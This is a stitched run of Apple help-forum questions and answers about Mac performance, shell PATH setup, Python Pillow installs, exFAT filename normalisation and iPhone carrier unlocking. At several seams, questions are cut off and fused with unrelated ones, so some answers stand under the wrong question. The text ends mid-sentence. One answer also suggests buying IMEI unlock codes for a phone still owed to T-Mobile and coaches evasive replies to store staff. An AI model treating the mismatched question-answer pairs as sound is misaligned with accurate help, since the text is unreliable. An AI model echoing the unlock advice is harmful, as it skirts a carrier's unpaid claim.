It happens both when using Skype and Zoom. Under normal conditions it's fast and smooth, but as soon as I use video chat things go south and the computer becomes unresponsive and sluggish. \nI think what may be related to it is that I'm using both an external monitor and an iMac (via thunderbolt). But it's strange to me that it all functions correctly when I'm not on video chat, even when I have the laptop screen open as well.\nAny ideas what could cause this?\nThe specs of my computer are:\n\n\n*\n\n*Macbook Pro (retina, mid 2012) running on OSX 10.13.5\n\n*2.3 GHz i7\n\n*16GB RAM\n\n*256GB SSD\n\n*GeForce GT 650M\n\n\nA: It is more than likely that the increased demand on the GPU (processing and RAM) by supporting both the external monitor and the MacBook Pro screen while using Skype or Zoom causes the MacBook Pro to lag. Since you mention that the GPU is rather old and has only 1 GB of RAM, this is probably the problem.\nSkype may give you the ability to lower the video quality and resolution, putting less demand on the GPU. If you can still Skype with the external monitor disconnected, this may be the best solution.\n", "Q: How to reset Apple ID password without email access I received my wife's old iPhone and created an Apple account in my name. When I go to settings her name pops up. I hit that and it wants her password, however she doesn't remember.  She no longer has the email she signed up under so I can't have an email sent to the account.  Is there a way to change the name and account?\n\nA: Go to Apple's iForgot page and enter your Apple ID. From there, choose the Security Questions option and answer the questions. If you are correct, you should be able to reset the password. If not, you may have to contact Apple Support or go into an Apple Store.\n", "Q: How can my Mac still be falling asleep with Caffeinate? After long-running problems where my Mac mini (Late 2012 unibody) won't wake up from sleep, I started running caffeinate -s. But even this doesn't fix it. My Mac claims to still be running, flickering lights on my external hard drive, etc., but the monitor is asleep and says there is no signal.\nMy only options are to hard-boot, or weirdly to turn the hard drive off and on. This brings the monitor back awake \"the Mac will shortly restart\".\nWhat can be going on? Is something sleeping and failing to wake? Is my Mac just dying? Is my DP-based monitor trying to be too smart? It's a Dell U2715H.\n\nA: Missing some information, but I'll make some guesses: \n\n\n*\n\n*caffeinate -s only applies when system is running on ac power\n\n\nSo maybe assume this is an iMac? (from your reference to a \"DP-based monitor\") \n\n\n*caffeinate -d might be worth trying, but it's hard to say if an iMac can keep a non-Apple monitor from sleeping. \n\n\nThe fact that you're seeing activity lights on your external drive may or may not mean something... I have an external drive that blinks when it goes into idle mode :) \n\n\n*You might also try this: Start an app on your Mac, get its PID (e.g. 123) from Activity Monitor, and then run caffeinate - w 123\nA couple of other things to try that would verify the true state of your Mac: initiate a VNC connection to your Mac from another Mac or PC, or alternatively enable the remote login service for your Mac, and make an SSH connection to it. This would allow you to verify whether your Mac is really sleeping, or whether something else is going on. Simply pinging your Mac might also give some indications. \n", "Q: How to create link aggregates (bonded interfaces) in shell?

I have a MacBook Pro 15\" Mid 2015 and after 3 years of using it, I think it is broken since it won't power on. I already tried resetting SMC and NVRAM but it's still not working. I don't hear any chimes or any fan noises and my charger is still working properly. I tried charging it for more than 3 hours but the light is always orange/amber. I guess this is a logic board issue.\nI went to an Apple Center to get it fixed but they advised me to backup my SSD first because they don't do this service and they will wipe all of my files so they can diagnose it properly.\nSo my question is:\nHow do I backup my SSD when my MacBook doesn't even turn on? I'm guessing I need to remove the SSD but I don't know what to do after remove it.\n\nA: \nHow do I backup my SSD when my MacBook doesn't even turn on? I'm\nguessing I need to remove the SSD but I don't know what to do after\nremove it.\n\nYou are correct; you just need to remove it.\nWhat you do afterwards is put it in a safe place (like a desk drawer).\nWhy?\nThere's no need to erase, much less even have, an internal SSD to diagnose and repair a power issue.\nIf the \"Apple Center\" (you didn't say if they were an actual Apple Store or an authorized 3rd party repair facility) said that \"wiping\" the drive was necessary, I would look for another facility.\nYou can boot a MacBook from USB, another SSD, or from another MacBook (via Target Disk Mode) so there's no reason that they should get yours (as a side note, they should have spare ones with clean OSes for diagnostics). An internal drive is absolutely not necessary for diagnosis/repairs (unless of course the issue is the SSD itself). As it's a power issue, the SSD is irrelevant and shouldn't even be touched.\nThe fix...\nThe problem that you are experiencing is related to the DC-in board (aka the MagSafe board).\n\nBesides being the interface for your charger to your MacBook, it acts as a safeguard to ensure that you're not dumping 18V DC into your SMC (which handles power) that only takes 3 volts. (It's also very inexpensive).\nIt's not a complex fix, but it is detailed as you do have to remove the logic board. iFixit.com has an excellent step-by-step walk through on how to do this.  However, if this is not your cup-of-tea, I advise taking it in.\nThat said...you should be backing up on a regular basis.\n\nA: Try booting the Mac in target disk mode by holding the T key on bootup. Connect it to another Mac using a thunderbolt 3 cable (note: if you don't have one, it's probably not worth it to go out any buy one as this most likely won't work). If the broken mac shows up on the other mac, copy the files from it to your second computer.\nIf that doesn't work, you probably need to take out the SSD and get an adapter to connect it to another computer and copy the files.\nFollow this guide to take out the SSD from your computer. Keep in mind that this does come with risk and some tools will be needed. You can also ask an Apple Store and you can pay a bit to have them take it out.\nI found a (rather expensive) enclosure that you can put the SSD in when you take it out, however there is a most definitely a cheaper one out there.\nIn the future, back up your drives.\n", "Q: what does the pie symbol mean in macOS finder? could someone explain this symbol? The files are on a AFP share which is mounted.\n\nA: The pie symbol indicates that the element is being uploaded or downloaded to/from a server. Those elements may not be available locally.\nThe grayed part of the pie represents the percentage of data already transmitted so in your case as this part is very narrow it means that for each file the update has just started.\n\nA: The pie symbol is a progress indicator that indicates the manipulation of a file of some kind. Since you are taking about Apple Filing Protocol (AFP), you are most likely referring to either:\n\n\n*\n\n*Transferring from internal to network\n\n*Copying from network to network\n\n\nIt could also be:\n\n\n*\n\n*Transferring from a drive to another drive\n\n*Transferring from network drive\n\n*Copying a file\n\n*Safari (and other) downloading from the internet\n\n*and many more…\n\n\nAs @LouisLac said, this could also be uploading or downloading from iCloud.\n\nA: The colour of the pie icloud uses is indeed somewhat confusing.\nWhile I was looking at it as my files were synchronising I understand now:\nFull black means 100% sync.\nAnd white means the amount left to sync.\n\nFor example right now my drive is around 90% sync. And 10% files are left, waiting for sync on the icloud server and devices.\n", "Q: how to boot a from a DVD? On a friends older MacBook, I'm holding the ⌥ Option key with a bootable DVD inserted but am not seeing a boot menu.  I've tried rEFIt as well as some Linux DVD's I have lying about.  I've checked the DVD's on another system and they are bootable on non-Mac hardware fine.\nIn excruciating detail, what's the process for booting from a DVD for the Mac?  I've tried holding the ⌥ Option key, tapping, holding until I see an Apple logo -- and everything in between.\nI've previously gotten this particular machine to boot live Linux DVD's.  As I recall, that was with the option key -- and, I don't recall having to hold and release at specific junctures.  It has since had a Mac OS 10.x clean install.\nI installed Bodhi Linux, and then Lubuntu.  I don't recall jumping through any particular hoops, beyond, as best I recall, holding the option key until getting boot options.  It's like a firmware update, or perhaps newer OS, somehow made it harder to boot Linux or Linux type discs...?\nAs Allan suggests, the Genius Bar likely restored back to factory.  Which doesn't explain why option worked to boot to DVD before but doesn't anymore.\n\nA: Press and hold the C key on boot to attempt booting from the optical drive.\nIf that doesn't work I'd recommend trying the boot CD in another machine, and a different boot CD in the mac.\n", "Q: Add Environment Variable to PATH I am new to the Apple \"eco system\" and I am trying to setup my environment variables for local development.\nHere is what I have in my ~/.bash_profile (simplified for brevity):\nexport PATH=\"$JAVA_HOME/bin:$MAVEN_HOME/bin:$DEV_CLI:$PATH\"\nexport DEV_CLI=\"/path/to/cli/$BRANCH_NAME/bin\"\nexport BRANCH_NAME=dev\n\nWhat I want here is to have my dev cli accessible from any point in the terminal. The crucial thing here is I want to change the BRANCH_NAME on different occasions.\nCurrently my solution works only if I do source ~/.bash_profile in every terminal tab/window I use.\nSo let's say that I open new terminal and do:\n\n\n*\n\n*echo $DEV_CLI - it will be printed, \n\n*echo $PATH - the path for the cli will be missing there\n\n*source ~/.bash_profile\n\n*echo $PATH - all variables set in the path will be shown (cli path including)\n\n\nI am running on Mac High Seirra.\nAny help explanation will be deeply appreciated!\n\nA: Your variables are out of order.    You cannot set a variable based on  other variables defined after it.\nSet the commands in your ~/.bash_profile to the following:\nexport BRANCH_NAME=dev\nexport DEV_CLI=\"/path/to/cli/$BRANCH_NAME/bin\"\nexport PATH=\"$JAVA_HOME/bin:$MAVEN_HOME/bin:$DEV_CLI:$PATH\"\n\nWhy this is happening...\n\n\n*\n\n*When you open a new shell, it reads ~/.bash_profile\n\n*It sets a PATH environment variable with other environment variables that aren't defined yet (DEV_CLI and BRANCH_NAME)\n\n*The environment variables are then defined\n\n*You re-source ~/.bash_profile and sets the PATH again, this time with defined variables\n\n\nIt's important to note that this has nothing to do with the Apple \"eco system,\" per se.  This is a Bash issue, and more generally a shell issue; you would literally have this problem whether you were on Apple, BSD, Linux, Unix and even Windows.\n", "Q: iPhone 5S network query My iPhone 5S cellular network has ceased working. The iPhone is 3.5 years old and has been consistently reliable.  The battery is also working well.  I have tried the usual troubleshooting methods to restart the network, but none have worked.  I can used my mobile on WiFi and the Apps such as Facebook, WhatsApp and Viber still.   How can I recover the carrier cellular network?\n\nA: Unfortunately, it seems that a problem has developed with the LTE Modem portion of your iPhone (orange box).  It's a hardware issue.\n\nYou'll want to do a factory reset to see if it fixes it.  However, in my experience with symptoms like this, the only thing you can possibly do is take it in for service to a facility that specializes in this type of repair.\n", "Q: Can I remove the stock camera app from iOS 9 or later? I would like to be able to remove the stock camera app from an iOS device without disabling the camera itself (because I would like to replace the camera app with a non-stock app).  I know MDM applications allow the camera to be disabled via the iOS mobileconfig restrictions, but can I remove just the (original) app while keeping a functional camera?\n\nA: Short answer: no.\nAs of iOS 10, here are the stock apps that users can remove:\n\n\n*\n\n*Calculator\n\n*Calendar\n\n*Compass\n\n*Contacts (iPhone only, contact information is retained in the Phone\napp)\n\n*FaceTime\n\n*Find My Friends\n\n*Home\n\n*iBooks\n\n*iCloud Drive\n\n*iTunes Store\n\n*Mail\n\n*Maps\n\n*Music (if removed, you won't be able to use it with CarPlay)\n\n*News\n\n*Notes\n\n*Podcasts\n\n*Reminders\n\n*Stocks\n\n*Tips\n\n*Videos\n\n*Voice Memos\n\n*Watch app (you'll have to unpair your Apple Watch before deleting it)\n\n*Weather\n\n\nAs you can see, the stock Camera app is not one of these. I imagine there are ways to forcibly remove it, but you may lose that functionality of your iPhone permanently.\n\nA: There is no way of making the non-Apple Camera app the default, (by swiping the lock screen, for example,) if that is your intention.\nOn the other hand, if you want more advanced photography abilities, I've found the apps Camera+ (for full manual control of the camera settings,) CameraBag, and TrueHDR very useful. Using these apps does not require the stock camera be removed at all. \nDisclaimer: I'm not affiliated with, or have any financial stake in the developers of any of these apps.\n", "Q: Remove Program Association from Directory I have a directory, ~/Downloads, which has accidentally become associated with Terminal.app. I would like to remove the association so that the directory can be used with Finder.app again.

If not, why exFAT says all is right?\n\nNo, it is not safe and exFAT is not saying it's all right.  Disk Utility is just not telling you that's something's wrong when it writes the exFAT partition.\nA S.M.A.R.T. error is an error that is generated by the drive itself (not macOS) and this cannot be overridden by a format type (exFAT, APFS, HFS+, etc.)  The reason one format generates an error and another doesn't has to do (basicailly) where the partition is actually written to the physical disk.  With exFAT, that \"bad\" area isn't being written to, thus, no error.\nBottom line, the drive is proven to be failing; I wouldn't continue to use it.\n", "Q: Encrypted e-mail using a certificate not issued for that e-mail Scenario\nI'm using Apple Mail and S/MIME to encrypt my e-mails. If there is a certificate for an e-mail address I want to send an e-mail to, everything is fine. After inserting the e-mail address, Mail enables the blue lock and the e-mail is sent encrypted. \nMy problem is now: If I want to send an encrypted mail to a person whose certificate I have but this certificate is issued to an alias of the e-mail address the lock won't be enabled because mail does not find a certificate for that address. \nExample\nI have a (public) certificate installed for firstname.lastname@domain.com\nI want to send an e-mail to lastname@domain.com encrypted with the certificate of firstname.lastname@domain.com because the two addresses are aliases. \nNevertheless, Mail cannot encrypt the e-mail because it doesn't find a certificate for that address.\nQuestion\nIs there any way to configure Mail that for encrypting e-mails to lastname@domain.com the certificate of lastname@domain.com has to be used? \n\nA: That is not possible. It is the certificate that specifies the email address it can be used with. The allowed email address is in the email field, as well as in the rfc 822 name field, where more than one email address can be given.\nIt does not make sense to allow the sending client to use a certificate for email addresses that are different from those allowed by the certificate, because that presumes knowledge about internal alias mappings on the recipient side. If the recipient could and would want to accept emails encrypted with the certificate to any additional email addresses, they should have been listed in the certificate.\n", "Q: Reset Uniform Type Identifiers on Mac OS X A colleague of mine has developed a Mac OS X application that creates files with a relatively common file extension in my research field (.fits, an official image format for professional astronomical data). The problem is that these files have nothing to do with the official FITS format, and his application declares a uniform type identifier (UTI) associated with his .fits extension!\nNow the metadata of official FITS files, obtained with the mdls command, associate his UTI to these files, which screws up some other tools that I have that normally support official FITS files (a quicklook plugin, a viewing application). I erased his application, but the metadata still list his UTI for official FITS files...\nIs there any way to reset the UTIs that are \"known\" on my system? Or the association between UTIs and applications?\n\nA: Not sure, but try /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -kill -seed\n", "Q: Does the AirPod Case, or headphones when in the case, emit a bluetooth ID? I'm concerned about privacy and don't want my airpods (or the case) to emit the bluetooth ID while I'm shopping in malls that use iBeacon technology.\nHow can I be sure that the airpods (when stored in the case), and the case itself doesn't leak out a Bluetooth ID while I roam?\n\nA: When the case is closed with both AirPods inside, you can't locate the AirPods. It will only show the last know location which is when the AirPods were last connected to a paired device. So no Bluetooth is not emitting if the AirPods are in a case. Technically they are turned off.\nIf you want to test them you can place them in a case and then check for bluetooth signal or go to find my iPhone and see if you can locate them. It will only give last known location.\n", "Q: App to lock my iPhone for some time I already asked a similar question sometime ago (though that was focused on free apps) and the answers were negative, but I've done some research and it seems there could be a way.\nBasically, I’m looking for apps which lock the phone, either for a specific app (I.e. “don’t use Facebook for 1 day”) or for the full phone (I.e., “don’t use any app for the whole day, except for phone calls & SMS”). On Android this is doable with Offtime. On iOS Offtime (conveniently renamed to “Offtime light”) is totally useless (it doesn’t lock anything at all). \nHowever, on the iPhone I found two more apps which seem to be able to do what I want: Flipd and Freedom. \nFlipd\nThe app requires me to install a MDM certificate on my phone in order to allow locking. However, I don't know what a MDM certificate is, and since this is a company mobile, I cannot risk third parties to access my emails and documents. Is it safe to install the MDM certificate? \nFreedom\nThis app doesn't seem to require a MDM certificate (I can't be sure because I haven't downloaded it: it looks like there's no free trial, so before buying it I want to be sure it works). It does require a \"limited VPN\", though. Again, is this safe?\nIf both apps aren't safe, are there safe alternatives?\n\nA: I'm from the Flipd team and just wanted to chime in here. The MDM used to activate the Full Lock in order to hide your apps is completely safe. Not only does Apple thoroughly vet apps like ours that use MDM, the call we make via MDM is only to hide your third-party apps and then to push them back onto your device over the internet at a scheduled time. This feature is similar to Apple's Restrictions mode, but on a schedule. \nThe only error you might run into is if you have a weak or no internet connection; at which point your apps may not appear as scheduled. This is easily resolved by uninstalling the MDM and your apps will return immediately. \nI hope this helps!\n", "Q: Unstuffing an old encrypted .sit file I have several .sit files (compressed directories photos or text documents) from from the early 00's that I encrypted under OS 9 (I think). I have the password. I've tried extracting these using the Unarchiver, but of course, I didn't expect it to work on the encrypted files. \nIs there any way of decrypting and unstuffing these old files? \n\nA: I figured it out! Again, this is for a situation when you know the password.\n\n\n*\n\n*Download an OS9 emulator. I used SheepShaver and found a perfect bundle with everything here.\n\n*If OS9 detects that the file is encrypted (i.e. the files appears with a little yellow key symbol in the corner of the icon), try double-clicking on it or opening it through \"Apple File Security\" under Applications > Security.\n\n*If you get the error, The \"Apple File Security \" could not be opened because \"KeychainLib\" could not be found,\n\n\n*\n\n*Go to the Extensions Manager. \n\n*Under Control Panel, enable Keychain Access\n\n*Under Extensions, enable everything that starts with the word \"Security\".\n\n*Then restart.\n\n\n*If OS9 does not detect that the file is encrypted (i.e. no little lock symbol), you may have luck changing the file attributes as per the suggestion here (it goes without saying you should try this on a copy of your file first):\n\n\n*\n\n*In your normal OSX terminal, use xattr -w -x 'com.apple.FinderInfo' '65 6E 63 32 63 72 70 32 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00' yourfile.ext\n\n*This should signal to OS9 the file is encrypted and you should then see the little lock symbol. \n\n\n*Try double-clicking the file. If you get the error, A file error has occurred. The file may be damaged, try dragging the file to the OS9 desktop (instead of trying to decrypt it within the directory shared between OS9 and OSX).\n\n*When prompted, say you want to decrypt the file and type the passcode. \n\n*Unstuff the file with Stuffit Expander (in OS9).\n\n*Presto! Now you can bring the files back to the present.\n\n\nA: Assuming you are talking about .sit encrypted (not the actual file encrypted like with OpenSSL), you can use StuffIt Expander Mac. Although old, it works well and should be able to decrypt & decompress your .sit's. Its free too!\n\nUPDATE:\nI assumed wrong.\n", "Q: Mouse lagging on iMac I'm using iMac 21,5.\nSince my magic mouse broke, the new one wasn't working properly, it had insane lags, I bought another wireless gaming mouse and it works better but still have lag issues.\nI was checking Bluetooth/Mouse settings and it says:\n\"Keyboard connected.\nMouse not connected.\"\nPressing mouse to connect, doesn't do anything. \nMaybe the problem is there. Please help me.\n\nA: I was having similar trouble with a Logitech bluetooth keyboard and mouse, when I plugged the transponder dongle into the USB port on the back of my iMac.  Researching the issue, I found several people suggesting to move the USB dongle away from any USB 3.0 ports, and as an EE I figured it also wouldn't hurt to get it closer to the devices it's talking to.  So this is my setup now and I've been a happy camper ever since I bought a USB 2.0 hub, plugged the dongle into that, and moved it near my keyboard and mouse.  (Of course the hub is connected to the iMac in the back -- should be obvious, but just sayin.)\n\n", "Q: Should I jailbreak my phone or unlock it? My sister recently gave me her iPhone 7+ from T-mobile because she has switched phone companies. The only problem is she owes T-mobile for the phone but I doubt she is planning on paying off the phone anytime soon. It's still pretty new and in good condition, and I want to use it. Since she has not paid it off I know T-mobile has probably put some restrictions on it. \nWould unlocking it and using a sim from a different company help or would I have to jailbreak it, which is something I don't really want to do?\n\nA: I'd do neither, personally. I don't trust or like any unlocking service or jailbreaking, so I would try to check if it's carrier unlocked by this (optionally not contacting T-Mobile to ask them yet to unlock). \n\n\n*\n\n*https://support.apple.com/en-us/HT201328\nIf it's locked, I would take the phone to a T-Mobile shop and tell them truthfully  the essential facts you know:\n\n\n*\n\n*An acquaintance said they couldn't afford this phone and I'd like to see if I could establish service with it. Can you help me shop for a mobile plan?\n\n\nYou don't have to tell them who / relationship and certainly don't speculate. If they are probing to see what else you know about the phone, don't get nervous and do be polite and deliberate. Just repeat what you told them in pretty much the exact same words and then ask if they can help you. Just keep in your mind - you're notthe previous owner and you're the owner of the device now and this is a chance for them to earn your business. \nIt's not their \"business\" if you paid for it or not and they shouldn't tell you anything about the previous owner. It is their business to help you pick out a plan and understand if it has a contract or not and propose another plan if you don't like the one they suggested initially. From some very astute comments, you should probably protect yourself with a written bill of sale if you intend to say you \"own\" the device. Paying a dollar and writing up a transfer keeps you from lying if you go to the store. If it doesn't work out, you can always sell it back later to the previous owner.\nIf you can get service in your name and avoid a contract, I'd do it. Then you can look at getting it unlocked after a month or two if you're not happy with your service in getting the phone working and with the service as a user of T-Mobile. At that point, they'll have a much harder time saying you're to be penalized as a paid up customer asking for an unlock.\nMake sure that whomever signs into this iPhone doesn't keep \"Find My iPhone\" turned on. If the device ever gets locked and the user doesn't know the password or can't get the verification code to the account. You will be stuck with an expensive coaster that Apple won't be able to help you with. They will need the proof of purchase and that doesn't exist since only T-Mobile has that and will not give that up until the balance is due.\n\nA: I would unlock the phone. Jailbreaking doesn't = carrier unlocked.\nJailbreaking is similar to rooting an Android phone and is unrelated to unlocking carrier lock.\nNote that The AT&T and T-Mobile IPhone 7 variants, only come with a GSM chip. That means you can’t use an AT&T or T-Mobile iPhone on Verizon or Sprint, since those versions don’t have CDMA chips. (You can, however, take an AT&T iPhone to T-Mobile, or vice versa).\nAlso note, most of the entire world uses GSM, so you should be fine in 1st world countries like Europe. I'm not sure if other countries are dominated by GSM/CDMA but it's worth researching before travelling. Eg: Most of Northern Canada is dominated by CDMA coverage only, but this is changing as well (albeit slowly).\nhttps://www.howtogeek.com/271333/can-i-bring-my-iphone-to-another-carrier/\nThere are many options on where to purchase an IMEI unlock code, here is what I found after a quick Google.\nThe #1 IMEI provider I found for iPhone 7 and 7 Plus was OfficialiPhoneUnlock\nhttps://whytheluckystiff.net/iphone-7-unlock-2/#reviews\nPS: Shoot your sister some cash!\nHow I have unlocked phones in the past (Only tested on BlackBerry and Android):\nInsert foreign SIM >> If it works, phone is already unlocked!\nIf it asks for IMEI unlocke code you have a few options:\n\n\n*\n\n*Purchase one online (I've paid as little as 1$ on Ebay for BlackBerry Code, to $30 for Android Code).\n\n*Call Carrier and see if they will provide the code (It may be best to have original purchaser call, or at least be available to validate) (In Canada, this has became a legal right of the consumer on day 1 to ask for the code, possibly Europe has similar laws, I don't think the US does, but state laws may vary)\n\n\nEnter IMEI Code >> Phone should connect and work immediatley (Try reboot if not)\nIf it doesn't then what you are looking for is called APN Settings. Usually your phone will set this up for you, but if needed, you can use google or just call carrier. They should be able to provide this information even without an account.\n", "Q: ZSH started printed env on startup I started XTerm today and for some reason ZSH is printing what looks like env when my shell starts up.

I've run into this issue with PIL and Pillow.  I didn't realize PIL was already installed, so I ran:\nsudo pip install PIL\n\nAs best I knew, it installed PIL.  Then I wrote a program that used a feature in PIL that would not work due to a bug within PIL.  I started working on dealing with that issue and someone recommended uninstalling PIL and installing Pillow, which has a better interface for PIL.  So I did:\nsudo pip uninstall PIL\nsudo pip install Pillow\n\nThen, in a new Terminal window I had just opened, I ran a Python script that included the line:\nimport Pillow\n\nand I get this error message:\nTraceback (most recent call last):\n  File \"../HalPy/LandSearch/GetOurLotMap.py\", line 7, in <module>\n    import Pillow\nImportError: No module named Pillow\n\nbut if I run:\npip show Pillow\n\nI get:\n---\nName: Pillow\nVersion: 5.2.0\nLocation: /Library/Python/2.7/site-packages\nRequires: \n\nI uninstalled Pillow then installed it with the --user option and it did install in my account Library directory tree, but that didn't work.

It's there, I've checked for the directory and pip shows it's there, but it's not.\nI've installed other modules with pip and they're put in the same directory (/Library/Python/2.7/site-packages) and are recognized.\nAs best I can tell, since PIL is included in Apple's install of Python, with all the modules in the /System/Library/Frameworks/Python.framework/ directory tree, when I use pip to install it (or Pillow), it's ignored by Python.\nBefore this, I had /Library/Python/2.7/site-packages in PYTHONPATH before any listing of any directories in the /System directory tree.  I also have, in /Library/Python/2.7/site-packages, a file named bypass-Apple-SIP.pth.  The .pth extension is supposed to help it supersede the modules in the /System directory tree.  Inside this file is:\nimport sys\nsys.path = ['/Library/Python/2.7/site-packages'] + sys.path\n\nFrom what I can tell, this has worked before, but I wasn't dealing with trying to supersede any module that was installed by default with Apple's Python install.\nIn the past I used MacPorts and found I hated it and had problems with Perl (and, I think, Python).  I don't want to use that, Fink, Homebrew, or anything like that.\nAs I see it, I'd like to find a way to do one of these:\n\n\n*\n\n*Uninstall the Apple installed PIL\n\n*Make sure Python gives priority to modules in /Library/Python/2.7/site-packages over pre-existing modules\n\n*Get Python to see any modules pip installs within my home directory tree and use them over the pre-installed modules\n\n*Anything else that lets me override the modules in /System/Library/Frameworks/Python.framework/ if I have problems with those pre-installed modules.\n\n\nHow can I do anything like any of those ideas to use Pillow over PIL and have Python ignore the old 1.x version of PIL that Apple installed?\n\nA: The solution to this is virtual environments.\nEach environment you have can have separate non conflicting libraries (and python versions) so one can have pillow and another pil.\nThe proicess is basically\n\n\n*\n\n*Create a new environment - this will create links to python etc\n\n*Install the libraries you want \n\n*Modify your shell environment so that the path points to the python you created in step 1\n\n\nTools are included in python 3.6 and 3.7.  To switch between different versions of python see pyenv.\nIf you need to install another python you might also consider conda.  This can include 2.7 and is sort of equivalent to the combination above but includes binaries of C libraries.\nFor Apple's python 2.7 see pipenv & virtual environments\n", "Q: Not able to login using Apple ID I am trying to login with Apple ID.

In this case I'm not sure that deleting your iCloud backup will help, since the new backup would just want to back up all of the photos again :)\n\n*If you use iCloud Photo Library, deleting the photos will delete them permanently and from all devices, so doing something like this is likely not what you want to do!\n\n*If the photos aren't on your device now, and they're only in that backup, then you definitely don't want to delete that backup. (I don't think that's the case here, but I want to make sure I say it!)\nBe sure to tread carefully before deleting things and make sure you know whether you use iCloud photo library before figuring out what to do! (Also I should note that iCloud Photo Library is different than Photo Stream and photo stream is NOT a permanent backup and shouldn't be used as a backup.)\n", "Q: Is Apple using the updated 2018 MacBook Pro keyboard when replacing older keyboards under the new keyboard service program? Apple revealed an updated 2018 MacBook Pro with an updated butterfly keyboard. I recently had my 2016 MacBook Pro keyboard replaced under the keyboard service program that was recently opened. Is Apple replacing older keyboards with the new keyboards under the keyboard service program?\n\nA: Nope, sadly not.\nFrom here:\n\nApple has been servicing affected keyboards free of charge, with the\n  process involving the replacement of one or more keys, or the whole\n  keyboard. For the MacBook Pro, the replacements are second-generation\n  keyboards -- often the 2017 variant with slightly different markings\n  on the Control and Option keys. \nWhen asked if Apple Stores and Apple Authorized Service Providers will\n  be permitted to replace second-generation keyboards on 2016 and 2017\n  MacBook Pro models with the new third-generation keyboards, if\n  necessary, Apple said, no, the third-generation keyboards are\n  exclusive to the 2018 MacBook Pro.\n\n\nA: This tangentially answers the question but not directly.  @JBis's answer is a better answer to the question, my answer provides supporting info.\n\nTeardowns on the new 2018 MBPs have started.  iFixIt has posted their analysis and an image of the keyboard.\nApple is calling this \"the new 3rd-generation keyboard\".  It appears to be the same as the 2nd-gen keyboard with the addition of a thin, rubberized membrane under the keycap.\n\nIn an interview with The Verge, Apple also stated \"this new third-generation keyboard wasn’t designed to solve those [dust] issues.”\niFixIt will continue its teardown of the new MBPs and will post more info in the coming weeks.  This membrane will help make the keyboard quieter, at least, and hopefully address some of the failure issues.\n", "Q: How to add google drive in your finder like dropbox and iCloud drive How can I add google drive in my finder menu so that I can directly share data to cloud like we do in Dropbox or iCloud ?\n\nA: Download & Install from here: https://www.google.com/drive/download/\nYour sync folder will be located at ~/Google Drive and will be automatically put in the side par of Finder.\n", "Q: Is there a keyboard shortcut to organize or align two finder windows? I know that there were some 3rd party apps that could do this in the past, but with each new version of Mac OS X, it seems that many of those 3rd party apps stop working or the project ages and loses it's maintainer.\nI'm wondering if there is a Mac OS X built-in keyboard shortcut to do this.  I suppose this wouldn't be limited to finder windows, but for windows of any application.\n\nA: As far as I know, there is no \"out of the box\" way or any system shortcut, to be able to align or arrange Finder windows.  However, using Script Editor.app to create an AppleScript to set the bounds (size and location) of the finder windows, you can then bring your finished AppleScript code into Automator.app by creating a new document in Automator and selecting \"Service\" as the new document type.\n\n\n\nThe next step would be adding a run AppleScript action to the workflow, then paste the previously mentioned AppleScript, which we compiled in Script Editor.app, into the run AppleScript action in Automator\n\n\n\nNext you would save and name the Automator service (I named it \"Arrange Finder Windows\").  After this, your new service will be available in system preferences at which point you can assign it a keyboard shortcut.\n\n\n\nNow let's take a look at the process involved in creating the script in Script Editor.app, to manipulate the Finder windows.  Using my 15\" MacBook Pro, I have 5 different Display Resolutions I can choose from.  What I'm getting at is, if my current display resolution is set at \"Default\", whatever code I create which will manipulate finder windows, Will function correctly only when I'm using the default display resolution.  At a later point if I decide to change my Display either higher or lower, the code I created while using the default display, will actually place the Finder windows in different locations as they were originally meant. \nIn short, the goal here is to be able to align and arrange Finder windows(processing from one up to six windows) no matter which Display Resolution I am currently using.\n\nThis first part of the following code sets property values for all five different display resolutions I can choose in system preferences\n-- ALL POSSIBLE DISPLAY RESOLUTION VALUES IN SYSTEM PREFERENCES --\nproperty displayRezolution_Lowest : {0, 0, 1024, 640}\nproperty displayRezolution_Lower : {0, 0, 1280, 800}\nproperty displayRezolution_Default : {0, 0, 1440, 900}\nproperty displayRezolution_Higher : {0, 0, 1680, 1050}\nproperty displayRezolution_Highest : {0, 0, 1920, 1200}\n\n\nThis next snippet of code will retrieve the actual display resolution currently being used on the monitor\n-- GETS THE CURRENT DISPLAY RESOLUTION BEING USED --\ntell application \"Finder\" to set getRezolution to get bounds of window of desktop\n\n\nThis next snippet determines which script object to run based on the current display resolution.  (I created five different script objects, one script for every Display resolution... Each of which contains different values for the bounds of the finder windows\n-- DETERMINES WHICH SCRIPT TO RUN BASED ON THE CURRENT DISPLAY RESOLUTION --\nif getRezolution is equal to

Help much appreciated!\n(Using 10.13.4 + ExFAT on external drive)\n\nA: It took me a long time to come to this summary, but I think it's the definitive answer.\nThe cause of my issue is a well-known one:\n\nOS X is the odd one out, both in that it normalizes file names and in that it uses NFD instead of the more common NFC.\n\nHistorically (not that old, pre 10.11 era), OS X + HFS+ enforces NFD form on all filenames, and you will only get NFD result from commands and system calls.\nThen things starts to change, in 10.11, some system call results are normalized to NFC, which puts it inline with Windows and Linux, but at the expense of breaking some programs that expect NFD on OS X.\nBut since the introduction of macOS 10.13 + AFPS, the behavior changes again: Apple decides it wants to normalize to NFD on display and system calls, but leave the original filenames as it is (so both NFC and NFD are supported, but if you select the filename in Finder or copy ls result in Terminal, you get NFD form).\nThis is all great, until you put a file with NFD filename in an external drive using exFAT (as it's the only cross-macOS/Windows format with 4GB+ file size support): macOS 10.13 somehow believe your file must be in NFC format, so it bugged out.\nIn fact, here is a quick test, I have a folder in Windows on my exFAT drive with 3 files:\n\n\n\n*\n\n*test.mp3\n\n*Ēlusion.mp3 (Ē in NFC)\n\n*03 - Ēlusion (Ē in NFD)\n\n\n(You can copy the exact unicode here)\nWhen I mount them on my macOS, this is what I see:\n\nand ls -laib result:\n$ ls -laib\ntotal 46592\n2762318 drwxrwxrwx  1 user  staff    131072 Jan  3  2017 .\n2685260 drwxrwxrwx  1 user  staff    131072 Jan  3  2017 ..\n1572961 -rwxrwxrwx  1 user  staff  11672464 Aug 23  2014 Ēlusion.mp3\n1572871 -rwxrwxrwx  1 user  staff  11672464 Aug 23  2014 test.mp3\n\nAs you can see, the NFC file is present but NFD file is missing.\nEven if you are aware of the NFC/NFD problem on OS X, you might not expect exFAT external drive to face this issue in the opposite way (NFC is fine, but NFD is pant-on-fire).\nBut what could have caused my music file to use NFD filename in the first place:\n\n\n*\n\n*I originally downloaded this music file on 10.9/10.10 with an older Mac, which enforces NFD filename.\n\n*At some point I move them away to a Windows + NTFS drive, which doesn't enforce NFC/NFD, so original 